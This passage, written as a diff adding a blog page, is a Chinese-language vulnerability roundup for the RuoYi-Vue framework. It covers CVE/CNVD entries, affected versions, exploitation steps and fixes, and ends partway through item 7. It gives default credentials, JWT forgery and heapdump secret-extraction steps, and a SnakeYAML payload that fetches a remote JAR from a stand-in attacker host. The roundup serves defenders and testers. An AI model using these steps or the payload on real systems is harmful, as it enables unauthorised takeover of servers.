@@ -1,0 +1,1178 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>若依（RuoYi-Vue）前后端分离版框架安全漏洞全面汇总 - Eccentric&#39;s Note</title><meta name="Description" content="本站主要用来收集整理资料、记录笔记，方便自己查询使用。"><meta property="og:url" content="https://188.hubu.eu.cc/posts/%E8%8B%A5%E4%BE%9Druoyi-vue%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%89%88%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%B1%87%E6%80%BB/">
+  <meta property="og:site_name" content="Eccentric&#39;s Note">
+  <meta property="og:title" content="若依（RuoYi-Vue）前后端分离版框架安全漏洞全面汇总">
+  <meta property="og:description" content="Spring Security &#43; JWT &#43; Vue.js 架构 | 16 个漏洞 | 含 CVE/CNVD 编号 整理时间：2026年5月">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-01T08:59:26+08:00">
+    <meta property="article:modified_time" content="2026-01-01T08:59:26+08:00">
+    <meta property="article:tag" content="Ruoyi">
+    <meta property="article:tag" content="漏洞">
+    <meta property="og:image" content="https://188.hubu.eu.cc/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://188.hubu.eu.cc/logo.png">
+  <meta name="twitter:title" content="若依（RuoYi-Vue）前后端分离版框架安全漏洞全面汇总">
+  <meta name="twitter:description" content="Spring Security &#43; JWT &#43; Vue.js 架构 | 16 个漏洞 | 含 CVE/CNVD 编号 整理时间：2026年5月">
+<meta name="application-name" content="Eccentric&#39;s Note">
+<meta name="apple-mobile-web-app-title" content="Eccentric&#39;s Note"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/header_images/favicon-32x32.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://188.hubu.eu.cc/posts/%E8%8B%A5%E4%BE%9Druoyi-vue%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%89%88%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%B1%87%E6%80%BB/" /><link rel="prev" href="https://188.hubu.eu.cc/posts/%E4%BB%80%E4%B9%88%E6%98%AF%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1/" /><link rel="next" href="https://188.hubu.eu.cc/posts/spring-bean%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "若依（RuoYi-Vue）前后端分离版框架安全漏洞全面汇总",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/188.hubu.eu.cc\/posts\/%E8%8B%A5%E4%BE%9Druoyi-vue%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%89%88%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%B1%87%E6%80%BB\/"
+        },"genre": "posts","keywords": "ruoyi, 漏洞","wordcount":  5932 ,
+        "url": "https:\/\/188.hubu.eu.cc\/posts\/%E8%8B%A5%E4%BE%9Druoyi-vue%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%89%88%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%B1%87%E6%80%BB\/","datePublished": "2026-01-01T08:59:26+08:00","dateModified": "2026-01-01T08:59:26+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Better"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Eccentric&#39;s Note">Eccentric&#39;s Note</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 首页 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/posts/"> 归档 </a><a class="menu-item" href="/pdflist/"><i class='fa-solid fa-book'></i> pdf </a><a class="menu-item" href="/friend/" title="友链"><i class='fa-solid fa-link'></i> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/hubu8" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Eccentric&#39;s Note">Eccentric&#39;s Note</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">首页</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/posts/" title="">归档</a><a class="menu-item" href="/pdflist/" title=""><i class='fa-solid fa-book'></i>pdf</a><a class="menu-item" href="/friend/" title="友链"><i class='fa-solid fa-link'></i>友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/hubu8" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">若依（RuoYi-Vue）前后端分离版框架安全漏洞全面汇总</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Better</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/java%E5%90%8E%E7%AB%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Java后端</a>&nbsp;<a href="/categories/ruoyi/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ruoyi</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2026-01-01">2026-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 5932 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 12 分钟&nbsp;<span id="/posts/%E8%8B%A5%E4%BE%9Druoyi-vue%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%89%88%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9D%A2%E6%B1%87%E6%80%BB/" class="leancloud_visitors" data-flag-title="若依（RuoYi-Vue）前后端分离版框架安全漏洞全面汇总">
+                        <i class="far fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#架构安全差异对比">架构安全差异对比</a></li>
+    <li><a href="#漏洞总览速查表">漏洞总览速查表</a></li>
+    <li><a href="#1-前后端分离版特有漏洞jwtspring-securitycors">1. 前后端分离版特有漏洞（JWT/Spring Security/CORS）</a>
+      <ul>
+        <li><a href="#1-jwt-密钥硬编码导致-token-伪造--前后分离版特有-">1. JWT 密钥硬编码导致 Token 伪造 [ 前后分离版特有 ]</a></li>
+        <li><a href="#2-spring-security-配置不当接口未授权访问--前后分离版特有-">2. Spring Security 配置不当接口未授权访问 [ 前后分离版特有 ]</a></li>
+        <li><a href="#3-cors-跨域配置过于宽松--前后分离版特有-">3. CORS 跨域配置过于宽松 [ 前后分离版特有 ]</a></li>
+        <li><a href="#4-jwt-令牌有效期过长--前后分离版特有-">4. JWT 令牌有效期过长 [ 前后分离版特有 ]</a></li>
+        <li><a href="#5-druid-监控台未授权访问前后分离部署暴露--前后分离版特有-">5. Druid 监控台未授权访问（前后分离部署暴露） [ 前后分离版特有 ]</a></li>
+        <li><a href="#6-spring-boot-actuator-信息泄露--前后分离版特有-">6. Spring Boot Actuator 信息泄露 [ 前后分离版特有 ]</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-远程代码执行rce漏洞">2. 远程代码执行（RCE）漏洞</a>
+      <ul>
+        <li><a href="#7-定时任务-snakeyaml-反序列化-rce--共通漏洞-">7. 定时任务 SnakeYAML 反序列化 RCE [ 共通漏洞 ]</a></li>
+        <li><a href="#8-定时任务-jndi-注入-rce--共通漏洞-">8. 定时任务 JNDI 注入 RCE [ 共通漏洞 ]</a></li>
+        <li><a href="#9-gentable-sql-注入--定时任务-rce组合利用--共通漏洞-">9. GenTable SQL 注入 + 定时任务 RCE（组合利用） [ 共通漏洞 ]</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-sql-注入漏洞">3. SQL 注入漏洞</a>
+      <ul>
+        <li><a href="#10-认证用户-createtable-接口-sql-注入--共通漏洞-">10. 认证用户 createTable 接口 SQL 注入 [ 共通漏洞 ]</a></li>
+        <li><a href="#11-后台-datascope-参数-sql-注入--共通漏洞-">11. 后台 dataScope 参数 SQL 注入 [ 共通漏洞 ]</a></li>
+        <li><a href="#12-orderbycolumn-排序参数-sql-注入--共通漏洞-">12. orderByColumn 排序参数 SQL 注入 [ 共通漏洞 ]</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-文件操作与其他漏洞">4. 文件操作与其他漏洞</a>
+      <ul>
+        <li><a href="#13-任意文件下载定时任务修改路径--共通漏洞-">13. 任意文件下载（定时任务修改路径） [ 共通漏洞 ]</a></li>
+        <li><a href="#14-任意文件上传存储型-xss--rce--共通漏洞-">14. 任意文件上传（存储型 XSS / RCE） [ 共通漏洞 ]</a></li>
+        <li><a href="#15-默认弱口令-adminadmin123--共通漏洞-">15. 默认弱口令 admin/admin123 [ 共通漏洞 ]</a></li>
+        <li><a href="#16-swagger-api-文档未授权访问--共通漏洞-">16. Swagger API 文档未授权访问 [ 共通漏洞 ]</a></li>
+      </ul>
+    </li>
+    <li><a href="#渗透测试重点路径">渗透测试重点路径</a></li>
+    <li><a href="#通用安全加固建议">通用安全加固建议</a></li>
+    <li><a href="#参考来源">参考来源</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Spring Security + JWT + Vue.js 架构  |  16 个漏洞  |  含 CVE/CNVD 编号
+整理时间：2026年5月</p>
+<h2 id="前言">前言</h2>
+<p>若依前后端分离版（RuoYi-Vue）基于 Spring Boot + Spring Security + JWT + Vue.js 架构，是若依框架使用最广泛的版本之一。相比单体版（使用 Shiro + Thymeleaf），前后分离版不存在 Shiro 反序列化和 SSTI 模板注入漏洞，但引入了 JWT 认证机制相关的新攻击面，同时保留了定时任务 RCE、SQL 注入等共通漏洞。</p>
+<h2 id="架构安全差异对比">架构安全差异对比</h2>
+<table>
+  <thead>
+      <tr>
+          <th>对比项</th>
+          <th>单体版 (RuoYi)</th>
+          <th>前后分离版 (RuoYi-Vue)</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>认证框架</td>
+          <td>Apache Shiro</td>
+          <td>Spring Security + JWT</td>
+      </tr>
+      <tr>
+          <td>模板引擎</td>
+          <td>Thymeleaf（后端渲染）</td>
+          <td>Vue.js（前端渲染）</td>
+      </tr>
+      <tr>
+          <td>Shiro 反序列化</td>
+          <td>存在（默认密钥）</td>
+          <td>不存在（无 Shiro）</td>
+      </tr>
+      <tr>
+          <td>SSTI 模板注入</td>
+          <td>存在（Thymeleaf）</td>
+          <td>不存在（无后端模板）</td>
+      </tr>
+      <tr>
+          <td>JWT Token 伪造</td>
+          <td>不涉及</td>
+          <td>存在（密钥泄露风险）</td>
+      </tr>
+      <tr>
+          <td>CORS 跨域问题</td>
+          <td>不涉及（同源）</td>
+          <td>存在（跨域配置）</td>
+      </tr>
+      <tr>
+          <td>定时任务 RCE</td>
+          <td>直接利用（Shiro 易绕过）</td>
+          <td>需先获取管理员 JWT</td>
+      </tr>
+      <tr>
+          <td>SQL 注入</td>
+          <td>同样存在</td>
+          <td>同样存在</td>
+      </tr>
+      <tr>
+          <td>任意文件下载</td>
+          <td>同样存在</td>
+          <td>同样存在</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="漏洞总览速查表">漏洞总览速查表</h2>
+<table>
+  <thead>
+      <tr>
+          <th>#</th>
+          <th>漏洞名称</th>
+          <th>CVE/CNVD</th>
+          <th>影响版本</th>
+          <th>类型</th>
+          <th>等级</th>
+          <th>前后分离版</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>JWT 密钥硬编码导致 Token 伪造</td>
+          <td>CNVD-2020-69484</td>
+          <td>&lt;= 3.4.0 及未改密钥版本</td>
+          <td>认证绕过/未授权访问</td>
+          <td>严重</td>
+          <td>特有</td>
+      </tr>
+      <tr>
+          <td>2</td>
+          <td>Spring Security 配置不当接口未授权访问</td>
+          <td>Gitee Issue I1YW3M</td>
+          <td>多个早期版本</td>
+          <td>访问控制缺陷</td>
+          <td>高危</td>
+          <td>特有</td>
+      </tr>
+      <tr>
+          <td>3</td>
+          <td>CORS 跨域配置过于宽松</td>
+          <td>无</td>
+          <td>所有版本（配置相关）</td>
+          <td>跨域配置缺陷</td>
+          <td>中危</td>
+          <td>特有</td>
+      </tr>
+      <tr>
+          <td>4</td>
+          <td>JWT 令牌有效期过长</td>
+          <td>无</td>
+          <td>默认配置（2小时）</td>
+          <td>会话管理缺陷</td>
+          <td>中危</td>
+          <td>特有</td>
+      </tr>
+      <tr>
+          <td>5</td>
+          <td>Druid 监控台未授权访问（前后分离部署暴露）</td>
+          <td>无</td>
+          <td>多版本（配置相关）</td>
+          <td>未授权访问/信息泄露</td>
+          <td>中危</td>
+          <td>特有</td>
+      </tr>
+      <tr>
+          <td>6</td>
+          <td>Spring Boot Actuator 信息泄露</td>
+          <td>无</td>
+          <td>配置不当的所有版本</td>
+          <td>信息泄露</td>
+          <td>高危</td>
+          <td>特有</td>
+      </tr>
+      <tr>
+          <td>7</td>
+          <td>定时任务 SnakeYAML 反序列化 RCE</td>
+          <td>Gitee Issue I4NBQO</td>
+          <td>&lt;= v4.6.2</td>
+          <td>反序列化/RCE</td>
+          <td>严重</td>
+          <td>共通</td>
+      </tr>
+      <tr>
+          <td>8</td>
+          <td>定时任务 JNDI 注入 RCE</td>
+          <td>无</td>
+          <td>&lt;= v4.6.2（JDK &lt; 8u191）</td>
+          <td>JNDI注入/RCE</td>
+          <td>严重</td>
+          <td>共通</td>
+      </tr>
+      <tr>
+          <td>9</td>
+          <td>GenTable SQL 注入 + 定时任务 RCE（组合利用）</td>
+          <td>无公开 CVE</td>
+          <td>4.7.3 ~ 4.7.8</td>
+          <td>SQL注入+RCE</td>
+          <td>严重</td>
+          <td>共通</td>
+      </tr>
+      <tr>
+          <td>10</td>
+          <td>认证用户 createTable 接口 SQL 注入</td>
+          <td>CVE-2024-57521</td>
+          <td>&lt;= v4.7.9</td>
+          <td>SQL注入</td>
+          <td>高危</td>
+          <td>共通</td>
+      </tr>
+      <tr>
+          <td>11</td>
+          <td>后台 dataScope 参数 SQL 注入</td>
+          <td>CNVD-2021-21523</td>
+          <td>&lt;= v4.6.1</td>
+          <td>SQL注入</td>
+          <td>高危</td>
+          <td>共通</td>
+      </tr>
+      <tr>
+          <td>12</td>
+          <td>orderByColumn 排序参数 SQL 注入</td>
+          <td>无统一 CVE</td>
+          <td>多版本（含较新版本）</td>
+          <td>SQL注入</td>
+          <td>高危</td>
+          <td>共通</td>
+      </tr>
+      <tr>
+          <td>13</td>
+          <td>任意文件下载（定时任务修改路径）</td>
+          <td>CVE-2023-27025 / CNVD-2021-01931</td>
+          <td>&lt;= v4.7.6</td>
+          <td>任意文件下载</td>
+          <td>高危</td>
+          <td>共通</td>
+      </tr>
+      <tr>
+          <td>14</td>
+          <td>任意文件上传（存储型 XSS / RCE）</td>
+          <td>CVE-2022-32065</td>
+          <td>&lt;= v4.7.3</td>
+          <td>文件上传</td>
+          <td>高危</td>
+          <td>共通</td>
+      </tr>
+      <tr>
+          <td>15</td>
+          <td>默认弱口令 admin/admin123</td>
+          <td>无</td>
+          <td>所有版本</td>
+          <td>默认凭据</td>
+          <td>高危</td>
+          <td>共通</td>
+      </tr>
+      <tr>
+          <td>16</td>
+          <td>Swagger API 文档未授权访问</td>
+          <td>无</td>
+          <td>生产环境未关闭 Swagger 的版本</td>
+          <td>信息泄露</td>
+          <td>中危</td>
+          <td>共通</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="1-前后端分离版特有漏洞jwtspring-securitycors">1. 前后端分离版特有漏洞（JWT/Spring Security/CORS）</h2>
+<h3 id="1-jwt-密钥硬编码导致-token-伪造--前后分离版特有-">1. JWT 密钥硬编码导致 Token 伪造 [ 前后分离版特有 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>CNVD-2020-69484</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= 3.4.0 及未改密钥版本</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>认证绕过/未授权访问</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>RuoYi-Vue 在 application.yml 中配置了 JWT 的 token.secret 密钥（硬编码），早期版本使用弱默认密钥。攻击者通过反编译前端、源码泄露、GitHub 搜索等途径获取密钥后，可伪造任意用户身份的 JWT Token，绕过 Spring Security 认证实现完全未授权访问。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>获取 JWT 密钥（源码泄露/默认配置/Actuator heapdump）</p>
+</li>
+<li>
+<p>使用 jwt.io 等工具构造 Payload（sub 设为 admin）</p>
+</li>
+<li>
+<p>用获取的 secret 签名生成 Token</p>
+</li>
+<li>
+<p>携带伪造 Token 访问后台管理接口，实现完全越权</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>修改默认 token.secret 为强随机值（&gt;=32位）；将密钥配置为环境变量；缩短 Token 有效期至30分钟；实现 Token 黑名单/注销机制；考虑使用 RSA 非对称加密签发。</p>
+<h3 id="2-spring-security-配置不当接口未授权访问--前后分离版特有-">2. Spring Security 配置不当接口未授权访问 [ 前后分离版特有 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>Gitee Issue I1YW3M</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>多个早期版本</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>访问控制缺陷</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>SecurityConfig 中 .antMatchers() 配置了过多无需认证即可访问的资源路径（permitAll/anonymous），导致部分敏感接口可被未认证用户直接访问。Swagger 文档接口、Druid 监控页面等可能被放行。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>枚举 /prod-api 或 /dev-api 下的接口路径</p>
+</li>
+<li>
+<p>直接访问白名单中配置的敏感接口</p>
+</li>
+<li>
+<p>绕过 Spring Security 认证拦截获取数据或执行操作</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>最小化 permitAll() 路径配置；仅保留登录、验证码等必要匿名接口；审查所有 anonymous() 配置；Swagger/Druid/Actuator 纳入认证保护。</p>
+<h3 id="3-cors-跨域配置过于宽松--前后分离版特有-">3. CORS 跨域配置过于宽松 [ 前后分离版特有 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>无</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>所有版本（配置相关）</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>跨域配置缺陷</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>中危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>前后端分离架构需要 CORS 配置，ResourcesConfig 中默认使用 allowedOrigins(&quot;*&quot;) 允许所有来源跨域请求，同时 allowCredentials(true) 允许携带凭证。攻击者可在恶意网站上构造跨域请求，利用受害者已登录状态执行操作。配合 JWT 存储在 localStorage 的场景，可通过 XSS 窃取 Token。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>构造恶意网页，利用 CORS 配置缺陷</p>
+</li>
+<li>
+<p>诱导已登录用户访问恶意页面</p>
+</li>
+<li>
+<p>恶意页面发起跨域请求读取敏感数据或执行管理操作</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>将 allowedOrigins 配置为具体可信域名列表；使用 allowedOriginPatterns 替代通配符；限制 allowedMethods 仅允许必要 HTTP 方法。</p>
+<h3 id="4-jwt-令牌有效期过长--前后分离版特有-">4. JWT 令牌有效期过长 [ 前后分离版特有 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>无</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>默认配置（2小时）</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>会话管理缺陷</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>中危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>默认 JWT 有效期为 2 小时，远超等保三级要求的 30 分钟标准，且缺乏动态刷新和注销机制。Token 被窃取后攻击窗口过大，且用户无法主动使已签发的 Token 失效。</p>
+<p>利用方式</p>
+<p>通过 XSS、中间人攻击等方式获取用户 JWT Token 后，在长达2小时的窗口内可持续使用。</p>
+<p>修复建议</p>
+<p>将过期时间压缩至 30 分钟；启用剩余5分钟自动刷新机制；实现基于 Redis 的 Token 黑名单/注销机制。</p>
+<h3 id="5-druid-监控台未授权访问前后分离部署暴露--前后分离版特有-">5. Druid 监控台未授权访问（前后分离部署暴露） [ 前后分离版特有 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>无</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>多版本（配置相关）</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>未授权访问/信息泄露</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>中危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>前后端分离部署时，后端 API 通过 /prod-api 或 /dev-api 代理暴露。Druid 监控台可能通过 /prod-api/druid/login.html 访问，默认用户名密码为 ruoyi/123456。登录后可查看 SQL 执行记录、数据源配置、Session 等敏感信息。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>访问 /prod-api/druid/login.html</p>
+</li>
+<li>
+<p>使用默认凭据 ruoyi/123456 登录</p>
+</li>
+<li>
+<p>查看 SQL 监控获取数据库结构信息</p>
+</li>
+<li>
+<p>获取 Session 信息辅助攻击</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>生产环境禁用 Druid 监控台；或修改 Druid 登录密码；在 SecurityConfig 中拦截 /druid/** 路径。</p>
+<h3 id="6-spring-boot-actuator-信息泄露--前后分离版特有-">6. Spring Boot Actuator 信息泄露 [ 前后分离版特有 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>无</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>配置不当的所有版本</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>信息泄露</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>高危</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>若 Actuator 端点未限制访问，/actuator/env 泄露环境变量（含数据库密码、JWT 密钥），/actuator/heapdump 可下载 JVM 堆内存快照（可从中提取密钥和密码），/actuator/mappings 暴露所有 URL 映射信息。通过 heapdump 提取 JWT secret 后可直接伪造管理员 Token。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>访问 /actuator/heapdump 下载堆内存快照</p>
+</li>
+<li>
+<p>使用 JDumpSpider/MemoryAnalyzer 分析 heapdump</p>
+</li>
+<li>
+<p>搜索 token.secret 或 jwt 相关字符串提取密钥</p>
+</li>
+<li>
+<p>伪造管理员 JWT Token 接管系统</p>
+</li>
+</ol>
+<p>修复建议</p>
+<p>生产环境仅暴露 /actuator/health；配置 management.endpoints.web.exposure.include=health；将 Actuator 纳入 Spring Security 认证保护。</p>
+<h2 id="2-远程代码执行rce漏洞">2. 远程代码执行（RCE）漏洞</h2>
+<h3 id="7-定时任务-snakeyaml-反序列化-rce--共通漏洞-">7. 定时任务 SnakeYAML 反序列化 RCE [ 共通漏洞 ]</h3>
+<table>
+  <thead>
+      <tr>
+          <th>CVE/CNVD</th>
+          <th>Gitee Issue I4NBQO</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>影响版本</td>
+          <td>&lt;= v4.6.2</td>
+      </tr>
+      <tr>
+          <td>漏洞类型</td>
+          <td>反序列化/RCE</td>
+      </tr>
+      <tr>
+          <td>危害等级</td>
+          <td>严重</td>
+      </tr>
+  </tbody>
+</table>
+<p>漏洞描述</p>
+<p>定时任务支持类全路径调用，攻击者将调用目标设为 org.yaml.snakeyaml.Yaml.load()，配合 javax.script.ScriptEngineManager 与 URLClassLoader 加载远程恶意 JAR 包。利用 Java SPI 机制在实例化时加载攻击者托管的恶意 ScriptEngineFactory 实现。前后分离版需先获取管理员 JWT Token 才能操作定时任务。</p>
+<p>利用方式</p>
+<ol>
+<li>
+<p>获取管理员权限（JWT Token）</p>
+</li>
+<li>
+<p>创建定时任务，invokeTarget 设为 SnakeYAML payload</p>
+</li>
+<li>
+<p>org.yaml.snakeyaml.Yaml.load(&rsquo;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&ldquo;http://attacker/evil.jar&rdquo;]]]]')</p>
+</li>
+<li>
+<p>执行任务触发 RCE</p>
+</li>
+</ol>
+<p>修复建议</p>
